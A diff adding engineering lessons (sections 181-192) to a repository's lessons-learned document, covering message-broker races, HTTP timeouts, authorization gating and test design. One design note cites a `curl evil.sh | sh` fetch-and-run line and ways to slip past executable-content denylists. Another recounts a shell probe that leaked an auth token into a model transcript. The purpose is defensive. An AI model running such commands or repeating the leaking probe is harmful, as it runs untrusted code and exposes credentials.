@@ -4155,3 +4155,458 @@ scope or a superuser makes both halves of the assertion vacuous, and the positiv
 half fails silently: it will pass with the thing it is testing removed. Write the
 negative case with the weakest identity that should be refused and the positive
 case with the weakest identity that should be admitted.
+
+## 181. A fire-and-forget signal must have its subscription confirmed by the broker before the work it can interrupt is allowed to start, because losing that race does not delay delivery, it cancels it.
+
+**The incident.** Job cancel's control channel is deliberately core NATS rather than the durable
+`event.Bus`: a cancel means something only to whoever is listening at the moment it is sent, and
+`Bus.Subscribe` builds a consumer group that would hand it to one arbitrary Runner instead of the
+one holding the job. That reasoning was right. What it made easy to forget is what the same
+property costs on the SUBSCRIBE side. nats.go buffers the `SUB` line and writes it
+asynchronously, so `Subscribe` returning means the client intends to subscribe, not that the
+server will route anything to it yet. With a durable subject the gap is invisible, because the
+message waits. With a core publish there is nothing to wait: the server routes to whoever is
+registered at that instant and discards the rest.
+
+`executeWithLease` subscribed and then immediately called `Execute`, so the unregistered window
+sat exactly across the start of a run, which is the single most likely moment for somebody who
+has just launched something to stop it.
+
+**Why the first diagnosis was wrong, and what corrected it.** The failure arrived under parallel
+container load in a package already listed in `flaky-packages.json`, and it looked precisely like
+FAILURE_PATTERNS #61 resource contention. The move that settled it was raising the deadline
+rather than lowering it: a contention theory predicts that a thirty-second budget passes where a
+two-second one failed, and instead the test failed for the full thirty seconds. A timeout that
+does not care how long it is given is not measuring slowness. That is a cheap, general
+discriminator worth reaching for before accepting a flake explanation, and it is cheaper than it
+looks, because a passing run returns as soon as its condition is met and pays none of the extra
+budget.
+
+**The asymmetry that hid it.** Delivery to a subscriber on the PUBLISHING connection worked every
+time, because the `SUB` and the `PUB` share one write buffer and arrive in that order in a single
+flush. Only a second connection could see the bug. A test with one connection would have passed
+forever, which is also why the two-subscriber arrangement was worth building: it was written to
+prove delivery reaches everybody rather than one consumer-group member, and it caught a
+registration bug instead.
+
+**The symmetric obligation.** The first fix left the test's own raw wildcard subscription
+unflushed, and it then failed by itself about one run in three, carrying the exact race the
+implementation had just been fixed for. A test that subscribes is a subscriber, and it owes the
+same discipline as the code it is testing.
+
+## 182. A timeout parameter is a promise about a whole operation, and a library default underneath it can quietly own a shorter one. A nil configuration field is a choice, not an absence.
+
+**Two instances, three years of code apart in reading order and both in this module.**
+
+`pkg/winrmexec` found it first, and found it the expensive way. Windows refuses unencrypted
+WinRM by default, so every operation goes through `winrm.Encryption`, whose `Transport` method
+builds a bare `&http.Client{}`: no `Timeout`, the default transport, an unset and therefore
+unlimited `ResponseHeaderTimeout`, and requests built with `http.NewRequest` rather than
+`NewRequestWithContext`, so a caller's context never reaches the HTTP layer at all. The measured
+consequence was a task that reconfigured a device's own network address, destroying the
+connection carrying it, blocking for two minutes fifty-one seconds and then three minutes ten
+seconds on separate runs, with neither `Options.Timeout` nor a context deadline shortening
+either. That package documents all of it in thirty lines above the fix.
+
+`internal/catalog/http` then shipped the identical class (FAILURE_PATTERNS #218): the verifying
+path returned a bare `&http.Client{}`, a nil `Transport` means `http.DefaultTransport`, and its
+`TLSHandshakeTimeout` is a fixed ten seconds that the method's own documented `timeout`
+parameter could not reach. An operator asking for sixty got ten.
+
+**The lesson is not "remember about http.Client".** It is that the first instance's knowledge
+lived in a comment above the code that suffered from it, which is exactly where nobody writing a
+different HTTP client will ever read it. A defect class that has been found once and documented
+locally is not closed; it is closed when the next instance is either prevented or enumerable.
+The cheap enumeration here is a grep for `&http.Client{}`, `http.DefaultClient` and
+`DefaultTransport`, which takes seconds and today returns exactly these two sites.
+
+**Two specific habits fall out of it.**
+
+A nil field is a configuration decision rather than a blank. `&http.Client{}` is not an
+unconfigured client, it is the process-wide shared default one, with somebody else's deadlines
+and somebody else's connection pool. Reading it as "nothing set here" is what made both
+instances invisible to review.
+
+And when exposing a timeout, enumerate every deadline the call can hit rather than only the one
+being set. An operation with two deadlines where the caller controls one is an operation whose
+documented limit is a guess, and the failure surfaces as the shorter one, which is the one
+nobody wrote down.
+
+---
+
+## 183. Every gated control needs its relation in two places, and only one of them fails loudly
+
+**The rule.** An affordance-gated control is decided by two structures: the gate that asks
+whether a relation is permitted, and the candidate set the authorization layer is driven from.
+Adding a control to the first and not the second withholds it from everybody, silently, at every
+role. Before shipping a new kind of gated control, prove a PERMITTED caller can see it, not only
+that an unpermitted one cannot.
+
+**The incident.** `view.RowAction` was added so a section could act on one of its own rows. The
+resolver gated each control on `permits(a.Endpoint, aff)`, exactly as the header half already
+did, and every control rendered for nobody. `Descriptor.Candidates` collected the endpoints of a
+view's operations and its record actions and knew nothing about row actions, so the generator was
+never asked about the relation, it was never in the permitted set, and the gate answered no
+universally.
+
+**Why it is worth a rule rather than only a fix.** Withholding a control is what the affordance
+layer is FOR. A missing control and a correctly withheld control are the same rendering, so there
+is no observable difference between "you may not do this" and "nobody asked whether you may".
+Every other failure in this layer announces itself: a missing route is a 404, a missing scope is
+a 403, a missing endpoint is a startup refusal. This one produces a page that looks finished. It
+is the same shape as FAILURE_PATTERNS #73, where an unevaluable permitted set rendered as a
+read-only page, and the same answer applies: the positive case is the one that has to be
+asserted, because the negative case passes when the feature is absent entirely.
+
+**What to do.** When introducing a gated control, find the enumeration the authorization layer
+reads rather than the one the renderer reads, and add to both in the same change. Then write the
+test as "a caller who holds the relation sees the control", which fails when either half is
+missing, rather than "a caller who does not hold it does not", which passes when both are.
+
+---
+
+## 184. A refusal the operator can act on and a fault they cannot must not share a rendering
+
+**The rule.** When a write path fails, decide whether the reason is a rule the person at the
+keyboard can satisfy or a failure that is nobody's doing, and answer the two differently. A rule
+they can satisfy is shown to them, in the store's own words, on a page they can act from. A
+failure that is not theirs is logged and answered generically, because its message is not
+addressed to them and may carry whatever the failure happened to be holding.
+
+**The incident.** A row action has no form to attach a field error to, which is how every other
+write in this UI reports a refusal. So every failure it had went to `serverError`: the real
+reason into the log, and the words "internal error" onto the page. The case that made this
+untenable was ordinary rather than exotic. Removing an input a credential type's injector still
+references is refused by `credtype`, with a sentence naming the input and the dependency, and the
+operator resolves it by removing the injector first. Answering that with "internal error" hides
+the fix, tells them it was not their doing, and puts the sentence that would have resolved it in
+a log they cannot read.
+
+**The shape of the fix.** `view.Refuse` wraps the store's own error as one meant for the
+operator; the handler renders it through the shared zero state at its problem tone with a way
+back to the record, under 422, the status a form's validation failure already carries. It wraps
+rather than restates, so `errors.Is` still works above it and the words shown are the store's,
+which is the authority on why it refused. The resource decides which sentinels qualify, and only
+two did: an invalid type and a managed one. A driver error is not on that list.
+
+**The alternative that was rejected, and why.** A flash message on the record the control came
+from reads better and cannot be built honestly here. A flash has to survive a redirect, which
+means either session-keyed server state or a message reflected out of the URL, and a
+server-generated sentence arriving through a query parameter is a sentence anybody can put there.
+A page costs one navigation and reflects nothing.
+
+---
+
+## 185. A test that varies only one instance of the dimension a mechanism is keyed on proves nothing about that dimension
+
+**The rule.** When a mechanism is keyed on some dimension (a stream, a tenant, a scope, a
+namespace), a test that exercises it through a single value of that dimension cannot distinguish
+the real behaviour from a narrower one. It passes either way, and it will sit happily beside
+documentation asserting the narrower model, because nothing in the repository disagrees with it.
+Vary the key.
+
+**The incident.** `internal/event/nats_dedup_test.go` had two real-broker tests of JetStream's
+producer-side duplicate window: one proving a repeated publish is suppressed, one proving two
+distinct events are both stored. Both published to a single `const topic`. JetStream's dedup
+window is scoped to the **stream**, and this module puts every subject in one stream, so both
+tests were equally consistent with "dedup is per subject" and "dedup is per stream".
+
+They passed for five weeks while three doc comments in the module asserted the per-subject model,
+while the Controller stamped a dispatch with `"<jobID>:<deviceID>"` and the Runner published that
+device's result under the identical id, and while the broker silently discarded every result in
+the system. The doc comment directly above the offending line described the two keys agreeing
+"exactly, for the identical reason" as the mechanism working correctly. FAILURE_PATTERNS #222.
+
+**What makes this different from ordinary missing coverage.** The tests were not absent and were
+not weak: they were real, they ran against a real broker, and each proved a true thing. What they
+could not do was fail. Coverage tooling counts this path as covered, review reads two passing
+real-infrastructure tests and moves on, and the incorrect mental model they teach is then
+reproduced in the comments of everyone who reads them.
+
+**What to do.** For any keyed mechanism, write the test that holds the key constant and varies
+the thing the key is supposedly scoped to. Here that is two subjects sharing one message id
+against one stream. Assert the mechanism rather than the bug: a test pinning "the runner's key
+differs from the dispatch's" would have gone green on the fix and said nothing about why it must.
+
+---
+
+## 186. An API that reports "I did not do what you asked" through a success return must have its result read, and a wrapper that discards it is a silent failure factory
+
+**The rule.** Some calls report refusal in the return VALUE rather than the error: a suppressed
+duplicate, a conditional write that matched nothing, a partial batch, a no-op upsert. A wrapper
+that returns only `error` for such a call converts a loud failure into a silent one for every
+caller it will ever have, permanently and invisibly. When wrapping, either surface the outcome or
+be certain nobody can act on it.
+
+**The incident.** `internal/event.natsBus.Publish` called `js.PublishMsg` and discarded the
+`PubAck` with `_`. A suppressed duplicate comes back as `PubAck{Duplicate: true}` with a **nil
+error**, so a message the broker stored nowhere and a message it stored were the same value at
+every layer above that line. The Runner's `publishResult` therefore returned true, `flushOne`
+acknowledged the WAL entry and deleted the only durable copy, and the retry mechanism built
+precisely for lost publishes was defeated by the same nil error. Nothing logged anything.
+
+**The second half, which is the one that generalises further.** The Runner's own
+publish-failure log was at `Debug`, and `cmd/runner` builds its logger at `LevelInfo`. So even a
+*genuine*, error-returning publish failure was structurally unobservable in the production
+binary. A log level chosen at a call site is a claim about importance that the composition root
+can silently veto, and "we log it" is not the same as "it is observable".
+
+**What to do.** Read the ack. A duplicate stays a nil error, because dedup working is the
+mechanism doing its job and a caller retrying a publish it already made should not be handed a
+failure. But a publisher that believes it is sending something new wants to know, and the wrapper
+is the only place that can tell it. Before choosing `Debug` for a failure path, check what level
+the binary that runs it actually emits.
+
+---
+
+## 187. Unmarshalling into a reused value is a merge, and `omitempty` is what makes that a corruption bug
+
+**The rule.** `json.Unmarshal` into an already-populated value does not replace it. It reuses an
+existing slice's elements rather than allocating new ones, and it leaves a struct field untouched
+when the incoming JSON carries no key for it. Decode each response into a fresh value. The
+combination to watch for is a reused decode target, an `omitempty` field, and a collection with no
+guaranteed order: any two of those are harmless and all three silently move one record's data onto
+another.
+
+**The incident.** An e2e poller declared `var last jobResponse` outside its loop and unmarshalled
+every poll into it. A dispatched task's `reason` is `omitempty` and therefore absent from the JSON,
+so the decoder could not overwrite whatever occupied that slice slot before. The task list had no
+`ORDER BY`, and once results began landing the updates moved rows around, so a skipped device's
+reason ended up on a dispatched device's row. The assertion reported it as a fan-out defect and
+three investigations searched the write path, which was correct throughout.
+
+**Why `omitempty` is the load-bearing part.** The three fields beside it were plain-tagged, always
+present, and therefore always overwritten. They never went stale and never disagreed, which is
+also the signature that identifies this bug: if some fields of a record are consistent and one is
+not, the inconsistent one is the one the server omits.
+
+**The diagnostic half, which cost more than the bug.** Every failure message in that poller was
+built from the decoded value. A harness that corrupts its own decode then reports the corruption
+as though the server sent it, and nothing in the suite could tell the two apart. When a harness
+can be wrong about what arrived, its failure messages have to carry what actually arrived: keep
+the raw body and print it.
+
+**The API side.** An endpoint returning an array with no guaranteed order is a trap for any client
+written the obvious way, not only for a test harness. If a collection has a natural order, give it
+one.
+
+---
+
+## 188. A round-trip test must compare against what the test put in, never against how the page looked beforehand
+
+**The rule.** When testing that a read-modify-write cycle preserves data, the expectation has
+to come from OUTSIDE the cycle. Comparing the state before to the state after looks like the
+natural invariant and is blind to the most important failure: a value that the read never
+produced is missing from the "before" and the "after" alike, so the comparison holds while the
+data is destroyed.
+
+**The incident.** The test was "render the edit form, post back exactly what it offered, and
+nothing should change". It took four attempts to make it capable of failing, and each failed
+version would have shipped looking thorough:
+
+1. **It posted a hardcoded body.** A literal request body posts the right values whatever the
+   form rendered, so deleting the prefill entirely left it green. Fixed by reading the values
+   back off the rendered HTML, which is also what an operator pressing Save without touching
+   anything actually sends.
+2. **It compared the section's table.** That table renders five of the input's eight
+   properties, so `multiline`, `help` and `default` could be destroyed invisibly. Fixed by
+   comparing the form, which renders all of them.
+3. **It compared before to after.** This is the subtle one and the reason for the rule. A
+   dropped prefill is absent from both renders, so equality holds while the stored value is
+   overwritten with blank. Fixed by comparing against the literal values the test itself had
+   written in.
+4. **Its data was at the zero value.** A stored value equal to the type's zero round-trips
+   correctly even with its prefill deleted, so controls had to be given values that differ
+   from their zeros, across two records where one record could not hold them all.
+
+Each step was found the same way: delete one prefill, run the test, watch it pass. That loop
+is cheap and it is the only thing that distinguishes a test of a property from a test that
+merely exercises it. The final version was checked against all seven controls individually.
+
+**A fifth thing, worth its own sentence.** The first working version added a REQUIRED input to
+a shared fixture and broke an unrelated conformance test, because every credential of that type
+then had an unanswered required input. A test that mutates shared fixture state is a test that
+fails somebody else's assertion later; it built its own record instead.
+
+---
+
+## 189. A diagnostic that probes for a secret must be incapable of printing one, because the safe-looking half of `${VAR:+x}${VAR:-y}` is the half that leaks
+
+**The rule.** When checking whether a secret is present, use a construct that cannot emit its
+value under any branch. `[ -n "$VAR" ]` and `${#VAR}` cannot. `${VAR:-default}` can and will,
+because it substitutes the VALUE whenever the variable is non-empty, which is exactly the case
+a presence check is written to detect.
+
+**The incident.** A LocalStack auth token was needed by a coverage gate. Checking whether it
+had reached the shell, the probe was written as:
+
+```sh
+echo "TOKEN: ${VAR:+<set, length ${#VAR}>}${VAR:-<still unset>}"
+```
+
+It reads as "print a safe summary if set, otherwise print unset", and it is not that. Both
+expansions are evaluated and concatenated. When the variable is set, `${VAR:+...}` gives the
+safe summary and `${VAR:-<still unset>}` gives **the token**, so the one branch written to
+handle absence is the branch that printed the secret. The token went into the session
+transcript and through a model provider's context.
+
+**Why the usual defences did not apply.** Nothing was committed, and a later check confirmed
+zero occurrences across tracked files, the working tree, and the full history of every branch.
+The repository's own protections are aimed at secrets reaching the repo; this one never went
+near it. `gosec` does not read shell written at a prompt, and `commitgate` inspects the index.
+The exposure was a diagnostic, and diagnostics are the one category of code that exists
+precisely to print what you are unsure about.
+
+**The near miss worth naming.** The probe ran before a push rather than after, and the token
+lived in `~/.bashrc` rather than in a file under the working directory. Had it been in a
+`.env` the build sourced, the same carelessness would have put it somewhere a commit could
+sweep up. The outcome was better than the reasoning that produced it.
+
+**What to do.** Probe for presence with a construct that has no value-emitting branch:
+
+```sh
+[ -n "$VAR" ] && echo set || echo unset        # cannot print it
+echo "length: ${#VAR}"                          # cannot print it
+```
+
+And when a secret must be moved between shells, carry it by assignment rather than through
+anything that echoes: a command substitution feeding a variable prints nothing, while the same
+pipeline written to inspect the result prints everything. Rotation, not care, is the remedy
+once a secret has been displayed, because a transcript and a provider's logs are not files you
+can delete.
+
+---
+
+## 190. A content rule written as a denylist of known-bad shapes is defeated by the shapes nobody listed; write it as an allowlist of what can be proved inert
+
+Building the `file` survey question needed a rule for refusing executable content. The first
+sketch was the obvious one: a table of magic numbers (`\x7fELF`, `MZ`, `PK\x03\x04`, `\x1f\x8b`)
+plus a `#!` test. A design panel run in parallel killed it, and the argument is worth keeping
+because it generalises well past this feature.
+
+A denylist fails OPEN on everything absent from it. Every named bypass of a check like this lives
+in that gap: a byte-order mark before the shebang, a UTF-16 export whose ASCII is NUL-interleaved,
+a zip container, a polyglot, a format invented after the table was written. Each one needs its own
+entry, and the entry can only be written by somebody who already thought of it.
+
+An allowlist fails CLOSED on all of them without naming any. The rule that shipped is: valid
+UTF-8, no NUL byte anywhere, no byte-order mark prefix, and `#!` at offset zero exactly. An ELF is
+refused because it carries NUL, not because anybody listed ELF. A container format released next
+year is refused by a rule written today. The classifier's own zero value is the refusing class, so
+a classification that never ran refuses too.
+
+Two second-order rules came with it.
+
+**Refuse a byte-order mark rather than stripping it and re-checking.** Stripping and re-running is
+two passes over two different byte strings, and the desynchronisation between those passes is
+where this class of bug actually lives. Refusing at the mark means there is no second pass.
+
+**Name the flag for what it really governs.** The first name was `AllowExecutableFiles`. After the
+inert rule, the gate governs exactly one thing: whether the text announces itself with `#!`. It
+was renamed `AllowProgramContent` because the first name was a lie, and a flag whose name
+overstates what it does is worse than no flag: it invites the reading that whatever passes is safe.
+
+The residual risk is written into the code rather than into a document, in the "Known, deliberate
+residual risk" form this repository already uses. The check refuses a file that ANNOUNCES itself
+as a program and cannot refuse one that IS one. A text file holding `curl evil.sh | sh` passes
+every test and is accepted with both gates shut, because the dangerous property does not live in
+the bytes: it lives in what the automation does with them, and a runbook may already pipe any
+`text` answer to a shell with no flag at all. What the two gates buy is separation of duty --
+neither is settable by the person launching the job -- and saying so in the file is what stops the
+next reader from mistaking a guardrail for a sandbox.
+
+## 191. A gate that is only checked when a record is authored is not a gate; check it where the thing happens, and make the caller unable to supply it
+
+The `file` question's system-level permission is an environment variable the Controller reads at
+startup. The tempting place to enforce it is `Survey.Validate`, at save time: the template author
+gets an immediate error, and the check is one line.
+
+That would have been an authoring lint wearing a gate's name. A template authored while the
+deployment consented keeps its flag; withdrawing the consent would stop NEW templates being
+written and do nothing about every template already in production, which is the population that
+matters. So the deployment's half is consulted at LAUNCH, from a value threaded into the
+dispatcher at startup, and clearing the variable plus a restart immediately stops templates that
+already carry the flag. There is a test that asserts exactly that, with the template held
+identical across both halves and only the Controller's configuration differing.
+
+The second half is the one that makes the pair a real separation of duty. The policy rides
+`launch.Config`, and a `Config` is built by callers. The dispatcher therefore ASSIGNS it
+immediately before resolving, overwriting whatever the caller put there, rather than defaulting it
+when absent. A defaulting version passes every obvious test and lets anybody who can construct a
+Config grant themselves the deployment's consent -- which is one of the two gates. Proving that
+took a deliberate negative control: replacing the assignment with `if cfg.FilePolicy == zero` made
+the forgery test fail and nothing else, which is the shape of a test worth keeping.
+
+`pkg/remoteexec/knownhosts.go` already argued against exactly this kind of environment variable
+for host-key verification: "Deliberately a PATH and never a POLICY... an operator who sets a
+variable once forgets it, while a task parameter is written in the runbook next to the command it
+applies to and shows up in review." The distinction here is real and should be weighed rather than
+assumed: the variable alone permits nothing, and the thing it consents to IS a per-record
+parameter that shows up in review. The startup WARN exists because the "sets it once and forgets"
+failure is the same one.
+
+## 190. A gate must not run inside a hook whose caller has already opened a network connection; make the gate a process and the hook a receipt check
+
+**The incident.** `.githooks/pre-push` ran `make push-gate`, which takes roughly twenty minutes.
+Git opens its connection to the remote and fetches the ref advertisement BEFORE running that hook,
+because the hook's stdin carries the remote sha for each ref. So the gate ran inside a window git
+was holding a socket open for, and by the time it passed, the remote had dropped it. Every push
+exited 141 with no output while the gate printed "all checks passed". See FAILURE_PATTERNS #229.
+
+**The rule and why it generalises.** A hook is a decision point, not a workload. Whatever invoked
+it is holding resources whose lifetime nobody wrote down: a connection, a lock, a transaction, a
+lease. The longer the hook runs, the more of those expire, and the failure surfaces as something
+unrelated to the hook at a layer that cannot explain it. Run the expensive thing as its own
+process on its own schedule, have it record a verifiable result, and let the hook ask one question
+with an instant answer.
+
+**The receipt shape matters as much as the split.** It binds a COMMIT, not a tree, and it is only
+issued from a clean working tree. That makes the arrangement stricter than the hook it replaced,
+which is worth stating because it looks like a loosening: running the suite in the hook proved
+something about the working tree and then pushed commits, and with uncommitted edits those are
+different code. It records which gate ran, because `push-gate` tolerates a failure confined to a
+`flaky-packages.json` package and `ci` does not, and a reader who cannot tell them apart will
+eventually read a tolerated pass as a strict one. It carries a max age for exactly one reason:
+every check is a pure function of the tree except `govulncheck`, which reads a live advisory
+database, so an old pass still describes the same code while no longer answering that one
+question.
+
+## 191. A test failure in a package NOT on the flaky list is a defect until proven otherwise, and three of three were
+
+**The incident.** Three consecutive `make ci` runs failed in three different packages. The
+temptation each time was to read "different victim each run" as the contention signature and move
+on, because that discriminator is real and this repository documents it. But the discriminator's
+second half is the part that matters: contention is the explanation for a package that
+`flaky-packages.json` names with a written observed reason. For a package outside that list it is
+a hypothesis, not a finding.
+
+`internal/catalog/wait` was a truncate-then-write race that let the test pass for the wrong reason
+(#230). `pkg/serialexec` was a five second budget plus a wait loop blind to its own subprocess
+dying (#231). `internal/catalog/facts` could not be reproduced in eighty targeted runs and was
+left alone, which is the correct third answer and is not the same as waiving it.
+
+**The rule.** Run it alone to classify, then decide by LIST MEMBERSHIP rather than by the
+isolation result. Passing alone tells you the failure is timing sensitive; it tells you nothing
+about whether the timing sensitivity is a defect. A package that provisions containers and is
+listed with a reason has already had that question answered by somebody. A package that spawns one
+local subprocess has not, and adding it to the list to make a red run green converts an unexamined
+bug into a package nothing checks anywhere.
+
+**The third answer.** When it cannot be reproduced, say so and change nothing. A fix you cannot
+demonstrate is a change that does nothing while claiming to, and it costs the next reader the
+assumption that the area was examined.
+
+## 192. The exit status of a pipeline is the last command's, so wrapping a gate in `| tail` reports the pager's success and hides the failure
+
+**The incident.** `make ci | tail` and `git push | tail -20` were both read as green when the real
+command had failed, twice in one session, and the second one hid a push that never happened for
+three attempts. The same shape appears when a long command is wrapped for readability:
+`cmd > log; echo "EXIT=$?"` captures the echo's status if anything is piped after it, and
+`setsid cmd` without `--wait` returns immediately so the caller's status describes the fork, not
+the work.
+
+**The rule.** Capture the status of the command you care about, in its own statement, with nothing
+between: `cmd > log 2>&1; echo "EXIT=$?" >> log`, then read the log. For anything whose result
+will be reported to a person, verify the OUTCOME independently rather than the exit code:
+`git ls-remote` for a push, the artefact on disk for a build. An exit code is a claim about a
+process; the outcome is the thing being claimed.
